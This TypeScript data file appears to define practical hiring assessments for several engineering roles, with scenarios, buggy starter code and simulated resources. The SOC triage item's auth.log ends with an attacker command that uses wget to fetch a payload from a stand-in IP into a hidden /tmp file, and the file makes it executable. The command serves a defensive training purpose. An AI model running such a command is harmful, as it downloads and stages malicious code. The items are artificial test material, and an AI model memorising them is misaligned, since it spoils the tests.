import { PracticalAssessment } from '../types';

export const DEFAULT_ASSESSMENTS: PracticalAssessment[] = [
  // --- AI / ML ENGINEER ---
  {
    id: 'aiml-01-model-drift-triage',
    title: 'Production Model Degradation & Drift Triage',
    targetRole: 'AI / ML Engineer',
    difficulty: 'Intermediate',
    type: 'written',
    estimatedMinutes: 20,
    skillsAssessed: ['Python', 'Machine Learning Fundamentals', 'MLOps & Pipeline Automation', 'FastAPI / API Serving'],
    scenarioContext: `At 08:30 AM UTC, the alerting system for the production fraud detection service triggers an urgent alert: the inference accuracy score has dropped precipitously from 94.2% down to 71.8% over the past 48 hours following a new upstream data ingestion release. The engineering VP requires a structured diagnosis, immediate mitigation plan, and prevention strategy before the upcoming deployment freeze.`,
    instructions: [
      'Examine the provided production logs and latency telemetry in the resources panel.',
      'Identify the top 3 root cause hypotheses explaining the sudden accuracy degradation (e.g. covariate shift, schema change, feature store failure, categorical null values).',
      'Detail the exact diagnostic steps and scripts you will run first.',
      'Propose an immediate production containment action and a long-term automated monitoring solution.'
    ],
    providedResources: [
      {
        name: 'fraud_model_telemetry.log',
        type: 'log',
        size: '14 KB',
        description: 'Inference request logs, confidence scores, and input feature null-rate statistics over the last 48 hours.',
        content: `[2026-08-30 08:14:22] INFO  [InferenceService] batch_size=64 latency_ms=42.1 avg_confidence=0.932
[2026-08-30 18:30:00] INFO  [PipelineSync] Upstream customer_metadata_v2 schema applied. Field 'country_code' migrated to ISO-3166-1 alpha-3.
[2026-08-31 01:10:14] WARN  [FeatureExtractor] categorical_encoding: unrecognized token 'USA' mapped to default_index=0 (unknown). Fallback count: 18,490/20,000
[2026-08-31 04:00:19] ERROR [DriftMonitor] Feature 'device_trust_score' variance shifted from 1.42 to 0.04. Missing value imputation triggered.
[2026-08-31 08:00:00] ALERT [ModelEvaluator] Rolling 24h precision=0.718 (Baseline: 0.942). Recall=0.690.`
      },
      {
        name: 'model_card_and_schema.json',
        type: 'json',
        size: '3.2 KB',
        description: 'Model metadata, training distribution benchmarks, and expected feature types.',
        content: `{
  "model_name": "fraud_detection_xgboost_v3",
  "expected_features": ["amount_normalized", "transaction_velocity_1h", "country_code_encoded", "device_trust_score"],
  "training_country_code_format": "alpha-2 (US, GB, DE)",
  "critical_threshold": 0.85
}`
      }
    ],
    promptQuestions: [
      'What is the primary root cause of the accuracy collapse based on the telemetry logs and schema difference?',
      'Why did the model continue serving predictions instead of hard failing when the schema change occurred?',
      'What immediate action would you take right now to restore prediction accuracy?',
      'What automated MLOps safeguards (schema validation, drift monitors, canary deploy) should be implemented to prevent this from ever happening again?'
    ],
    requiredDeliverables: [
      'Root cause diagnosis with evidence cited from logs',
      'Immediate mitigation steps for production',
      'Preventative architecture and validation checks'
    ]
  },
  {
    id: 'aiml-02-fastapi-inference-optimization',
    title: 'High-Throughput ML Microservice & Docker Packaging',
    targetRole: 'AI / ML Engineer',
    difficulty: 'Advanced',
    type: 'code_submission',
    estimatedMinutes: 25,
    skillsAssessed: ['Python', 'FastAPI / API Serving', 'Docker & Containerization', 'MLOps & Pipeline Automation'],
    scenarioContext: `You are tasked with packaging an NLP text classification transformer into an asynchronous FastAPI service containerized with Docker. The service must achieve <45ms p95 latency under 200 concurrent requests without crashing the GPU worker with Out-Of-Memory (OOM) exceptions.`,
    instructions: [
      'Review the buggy synchronous starter script provided below.',
      'Refactor the endpoint to support batching / asynchronous workers with lifespan resource caching.',
      'Write a multi-stage Dockerfile that minimizes image size and avoids running as root.',
      'Explain your concurrency and memory management strategy.'
    ],
    starterCodeOrSnippet: `# BUGGY / SLOW STARTER CODE:
from fastapi import FastAPI
import torch
from transformers import AutoModelForSequenceClassification, AutoTokenizer

app = FastAPI()

# Problem: Loading model on every request or blocking global event loop
@app.post("/predict")
def predict_endpoint(payload: dict):
    # Reloading weights & tokenizer on each call!
    tokenizer = AutoTokenizer.from_pretrained("distilbert-base-uncased")
    model = AutoModelForSequenceClassification.from_pretrained("distilbert-base-uncased")
    
    text = payload.get("text", "")
    inputs = tokenizer(text, return_tensors="pt")
    with torch.no_grad():
        outputs = model(**inputs)
    logits = outputs.logits
    predicted_class = torch.argmax(logits, dim=1).item()
    return {"class": predicted_class}`,
    promptQuestions: [
      'Provide your refactored FastAPI implementation utilizing lifespan state and efficient batched tensor handling.',
      'Provide your secure, optimized Dockerfile for containerizing this service.',
      'How does your solution prevent thread-blocking during heavy compute execution?'
    ],
    requiredDeliverables: [
      'Refactored Python FastAPI code',
      'Production Dockerfile specification',
      'Performance and scaling explanation'
    ]
  },

  // --- SOFTWARE ENGINEER ---
  {
    id: 'swe-01-async-state-race-condition',
    title: 'React State Synchronization & Race Condition Fix',
    targetRole: 'Software Engineer',
    difficulty: 'Intermediate',
    type: 'code_submission',
    estimatedMinutes: 20,
    skillsAssessed: ['TypeScript / JavaScript', 'React / Frontend Architecture', 'Data Structures & Algorithms', 'Unit & Integration Testing'],
    scenarioContext: `Users on a high-traffic search dashboard report that when typing quickly in a debounced live search query, outdated network responses overwrite newer results (race condition), and rapid state updates cause severe input lag and memory leaks due to uncancelled abort controllers.`,
    instructions: [
      'Analyze the provided buggy React custom hook `useLiveSearch`.',
      'Rewrite the hook in TypeScript to incorporate `AbortController`, proper cleanup, cleanup debouncing, and memoized result caching.',
      'Provide a unit test scenario verifying that delayed out-of-order network responses are safely discarded.'
    ],
    starterCodeOrSnippet: `// BUGGY HOOK:
import { useState, useEffect } from 'react';

export function useLiveSearch(query: string) {
  const [results, setResults] = useState([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!query) return;
    setLoading(true);
    // Bug: No debouncing, no AbortController, out-of-order responses overwrite state!
    fetch(\`/api/search?q=\${query}\`)
      .then(res => res.json())
      .then(data => {
        setResults(data);
        setLoading(false);
      });
  }, [query]);

  return { results, loading };
}`,
    promptQuestions: [
      'Provide your corrected and production-ready `useLiveSearch` hook implementation.',
      'Explain how your implementation guarantees that stale asynchronous promises never overwrite recent search states.',
      'How would you write a test with Jest/Vitest to simulate an out-of-order response timing?'
    ],
    requiredDeliverables: [
      'TypeScript custom hook code with cleanup & abort handling',
      'Technical explanation of race condition resolution',
      'Unit test outline'
    ]
  },
  {
    id: 'swe-02-api-architecture-pagination',
    title: 'Scalable REST API & Cursor Pagination Design',
    targetRole: 'Software Engineer',
    difficulty: 'Intermediate',
    type: 'written',
    estimatedMinutes: 20,
    skillsAssessed: ['TypeScript / JavaScript', 'REST APIs & Web Standards', 'Data Structures & Algorithms', 'Unit & Integration Testing'],
    scenarioContext: `The frontend application needs to display an endless activity stream of 10,000,000+ events. Offset-based pagination (\`LIMIT 50 OFFSET 500000\`) is causing severe database CPU spikes and duplicate items when new records are inserted simultaneously. You are asked to design an efficient cursor-based pagination architecture.`,
    instructions: [
      'Explain why offset-based pagination fails at scale for dynamic high-write datasets.',
      'Design a robust cursor pagination API contract (URL params, payload schema, next_cursor encoding).',
      'Provide pseudo-code or TypeScript code for the API handler and database query.'
    ],
    promptQuestions: [
      'Why is offset pagination O(N) at database level while cursor pagination is O(1)?',
      'Detail the JSON contract for the `/api/v1/events` endpoint including cursor format.',
      'How do you handle multi-column sorting (e.g. `createdAt DESC, id DESC`) in cursor generation and decoding?'
    ],
    requiredDeliverables: [
      'Architectural analysis of offset vs cursor pagination',
      'Complete API schema specification',
      'TypeScript/SQL implementation strategy'
    ]
  },

  // --- BACKEND DEVELOPER ---
  {
    id: 'be-01-distributed-locking-idempotency',
    title: 'Double-Spending Incident & Distributed Locking',
    targetRole: 'Backend Developer',
    difficulty: 'Advanced',
    type: 'written',
    estimatedMinutes: 25,
    skillsAssessed: ['Database Design & SQL', 'Caching & Redis', 'Security & Authentication', 'API Architecture (REST / gRPC)'],
    scenarioContext: `A flash sale event resulted in 42 customer accounts purchasing the same limited-inventory item simultaneously because concurrent HTTP requests bypassed simple balance checks. The engineering director has declared a P1 incident and requires a solution with ACID transactional isolation and Redis distributed locking.`,
    instructions: [
      'Examine the vulnerable purchase flow code snippet in the resources panel.',
      'Design a resilient solution using an Idempotency-Key pattern and Redis Redlock / distributed mutex.',
      'Formulate the PostgreSQL transaction query with optimistic or pessimistic row locking (\`SELECT FOR UPDATE\`).'
    ],
    providedResources: [
      {
        name: 'vulnerable_checkout.ts',
        type: 'code',
        size: '2.1 KB',
        description: 'Vulnerable checkout endpoint handler allowing race condition double-spending.',
        content: `async function processCheckout(userId: string, itemId: string) {
  const item = await db.query('SELECT stock FROM items WHERE id = $1', [itemId]);
  if (item.stock > 0) {
    // Latency gap allows concurrent requests to enter!
    await paymentGateway.charge(userId, item.price);
    await db.query('UPDATE items SET stock = stock - 1 WHERE id = $1', [itemId]);
    return { success: true };
  }
  return { success: false, error: 'Out of stock' };
}`
      }
    ],
    promptQuestions: [
      'Identify the exact race condition window in `processCheckout` and explain how concurrent requests exploit it.',
      'Provide the corrected SQL transaction query with proper lock guarantees (`SELECT ... FOR UPDATE` or conditional decrement).',
      'Design the Idempotency Key architecture to prevent repeated payment charges if network times out.'
    ],
    requiredDeliverables: [
      'Concurrency vulnerability breakdown',
      'PostgreSQL ACID transaction code',
      'Distributed lock and idempotency pattern architecture'
    ]
  },
  {
    id: 'be-02-dead-letter-queue-resilience',
    title: 'Message Queue Poison Pill & Backpressure Failure',
    targetRole: 'Backend Developer',
    difficulty: 'Intermediate',
    type: 'written',
    estimatedMinutes: 20,
    skillsAssessed: ['Message Queues (Kafka / RabbitMQ)', 'Docker & Linux Systems', 'API Architecture (REST / gRPC)'],
    scenarioContext: `An unhandled exception in an asynchronous email notification consumer caused messages to loop continuously between RabbitMQ/Kafka and the worker, exhausting worker memory, triggering cascading OOM kills, and delaying 150,000 critical customer alerts.`,
    instructions: [
      'Diagnose the consumer failure loop and why poison pill messages blocked the queue partition.',
      'Design a robust retry mechanism with exponential backoff, maximum retry attempts, and routing to a Dead Letter Queue (DLQ).',
      'Explain how operators can inspect, alert on, and safely replay DLQ messages.'
    ],
    promptQuestions: [
      'What constitutes a "poison pill" message in event-driven systems and how does it degrade worker performance?',
      'Detail your retry strategy with jittered exponential backoff and DLQ routing.',
      'What alerting thresholds and metrics should be monitored to detect consumer lag and DLQ buildup?'
    ],
    requiredDeliverables: [
      'Poison pill failure mechanism analysis',
      'DLQ and retry policy architecture',
      'Operational playbook for incident resolution'
    ]
  },

  // --- DATA SCIENTIST ---
  {
    id: 'ds-01-ab-test-statistical-flaw',
    title: 'A/B Experimentation Analysis & Simpson\'s Paradox',
    targetRole: 'Data Scientist',
    difficulty: 'Intermediate',
    type: 'dataset_analysis',
    estimatedMinutes: 20,
    skillsAssessed: ['Python (Pandas, NumPy, SciPy)', 'Applied Statistics & Probability', 'Data Visualization & Storytelling'],
    scenarioContext: `The product team ran an A/B test on a new subscription pricing model. Overall metrics show Variant B has a higher aggregate conversion rate (12.4% vs 10.1%). However, when segmenting by desktop and mobile users, Variant A outperforms Variant B on BOTH platforms! The VP of Product is confused and asks for your definitive statistical analysis.`,
    instructions: [
      'Analyze the provided dataset summary table.',
      'Identify the statistical phenomenon occurring (Simpson\'s Paradox due to traffic allocation bias).',
      'Calculate the true weighted conversion rate and explain why the aggregate view is misleading.',
      'Recommend the correct experimental design for future rollouts.'
    ],
    providedResources: [
      {
        name: 'experiment_traffic_split.csv',
        type: 'csv',
        size: '1.8 KB',
        description: 'Segmented user counts and conversion rates across Mobile and Desktop for Variant A and B.',
        content: `Variant,Platform,Visitors,Conversions,ConversionRate
Variant A,Mobile,8000,800,10.0%
Variant A,Desktop,2000,400,20.0%
Variant A,Total,10000,1200,12.0%
Variant B,Mobile,2000,220,11.0%
Variant B,Desktop,8000,1840,23.0%
Variant B,Total,10000,2060,20.6%`
      }
    ],
    promptQuestions: [
      'Explain the mathematical cause of Simpson\'s Paradox in this experiment dataset.',
      'Why did Variant B receive 80% Desktop traffic while Variant A received 80% Mobile traffic?',
      'What would be your executive recommendation to the product team regarding which variant to launch?'
    ],
    requiredDeliverables: [
      'Statistical diagnosis of the allocation imbalance',
      'Segmented conversion breakdown with confidence intervals',
      'Executive recommendation summary'
    ]
  },

  // --- CLOUD ENGINEER ---
  {
    id: 'cloud-01-terraform-drift-and-iam',
    title: 'Terraform State Inconsistency & AWS IAM Hardening',
    targetRole: 'Cloud Engineer',
    difficulty: 'Intermediate',
    type: 'file_upload',
    estimatedMinutes: 20,
    skillsAssessed: ['AWS / GCP / Azure Architecture', 'Terraform / CloudFormation (IaC)', 'Linux Administration & Bash', 'Observability (Prometheus, Grafana, CloudWatch)'],
    scenarioContext: `An engineer manually modified a production AWS S3 bucket and security group via the AWS Console during an emergency. Now running \`terraform plan\` indicates that Terraform wants to destroy critical resources and recreate them with public access permissions. Additionally, an overly permissive IAM policy with \`"Action": "*"\` was found attached to the compute role.`,
    instructions: [
      'Review the Terraform file and the IAM policy document provided in resources.',
      'Explain how to safely reconcile the Terraform state with live cloud resources using `terraform import` / `refresh` without causing downtime.',
      'Refactor the IAM policy to adhere strictly to the principle of least privilege.'
    ],
    providedResources: [
      {
        name: 'main.tf',
        type: 'hcl',
        size: '1.5 KB',
        description: 'Terraform bucket and IAM role resource definitions.',
        content: `resource "aws_s3_bucket" "prod_assets" {
  bucket = "company-prod-assets-storage"
}

resource "aws_iam_role_policy" "service_policy" {
  name = "service-execution-policy"
  role = aws_iam_role.service_role.id

  # DANGEROUS: Wildcard permissions!
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "*"
      Effect = "Allow"
      Resource = "*"
    }]
  })
}`
      }
    ],
    promptQuestions: [
      'What commands will you run to resolve the Terraform state drift safely without destroying production resources?',
      'Rewrite the IAM policy into a secure least-privilege policy allowing only `s3:GetObject` and `s3:PutObject` on the specified bucket.',
      'How would you implement CI/CD checks (e.g. `tfsec` or `tflint`) to block wildcard IAM policies from being merged?'
    ],
    requiredDeliverables: [
      'Step-by-step Terraform drift reconciliation plan',
      'Hardened JSON IAM policy',
      'CI/CD governance recommendation'
    ]
  },

  // --- CYBERSECURITY ANALYST ---
  {
    id: 'sec-01-soc-auth-brute-force-triage',
    title: 'SOC Incident Triage: SSH Brute-Force & Privilege Escalation',
    targetRole: 'Cybersecurity Analyst',
    difficulty: 'Intermediate',
    type: 'dataset_analysis',
    estimatedMinutes: 20,
    skillsAssessed: ['SIEM & Log Telemetry (Splunk / ELK)', 'Threat Detection & Incident Response', 'Vulnerability Assessment (OWASP Top 10)', 'Network Security & Protocols'],
    scenarioContext: `At 03:17 UTC, the SIEM system alerts on anomalous SSH activity on production server \`srv-prod-api-04\`. An external IP address attempted 1,200 authentication attempts within 6 minutes, followed by a successful login under user \`deploy_svc\` and an immediate \`sudo /bin/bash\` execution. You must conduct immediate threat triage and incident containment.`,
    instructions: [
      'Inspect the provided `auth.log` telemetry snippet.',
      'Trace the attacker\'s timeline: initial brute-force attempts, successful credential compromise, and privilege escalation.',
      'State the exact containment steps you must execute immediately on the server and network.',
      'Outline the forensic evidence preservation actions and post-incident remediation.'
    ],
    providedResources: [
      {
        name: 'auth.log',
        type: 'log',
        size: '12 KB',
        description: 'Server authentication logs showing failed SSH attempts followed by session creation and sudo elevation.',
        content: `Aug 31 03:11:02 srv-prod-api-04 sshd[14201]: Failed password for root from 198.51.100.42 port 49120 ssh2
Aug 31 03:11:04 srv-prod-api-04 sshd[14204]: Failed password for admin from 198.51.100.42 port 49122 ssh2
[... 1198 repeated failed password logs ...]
Aug 31 03:17:15 srv-prod-api-04 sshd[15890]: Accepted password for deploy_svc from 198.51.100.42 port 50214 ssh2
Aug 31 03:17:16 srv-prod-api-04 sshd[15890]: pam_unix(sshd:session): session opened for user deploy_svc by (uid=0)
Aug 31 03:17:42 srv-prod-api-04 sudo: deploy_svc : TTY=pts/0 ; PWD=/home/deploy_svc ; USER=root ; COMMAND=/bin/bash
Aug 31 03:18:01 srv-prod-api-04 bash[15920]: wget http://198.51.100.42/payload.sh -O /tmp/.sysdaemon && chmod +x /tmp/.sysdaemon`
      }
    ],
    promptQuestions: [
      'What was the attacker IP, compromised account, and exact minute of successful infiltration?',
      'What malicious binary was downloaded and where is it located on the filesystem?',
      'What are your immediate four containment actions to isolate the compromised host without losing RAM forensics?',
      'How should SSH access and sudo privileges be permanently reconfigured on all fleet servers?'
    ],
    requiredDeliverables: [
      'Timeline of attack with log evidence',
      'Immediate containment protocol',
      'Remediation and hardening recommendations (key-based auth, fail2ban, sudoers restriction)'
    ]
  }
];

export function getAssessmentsForRole(roleName: string): PracticalAssessment[] {
  return DEFAULT_ASSESSMENTS.filter(
    (a) => a.targetRole.toLowerCase() === roleName.toLowerCase()
  );
}

export function getAssessmentById(id: string): PracticalAssessment | undefined {
  return DEFAULT_ASSESSMENTS.find((a) => a.id === id);
}
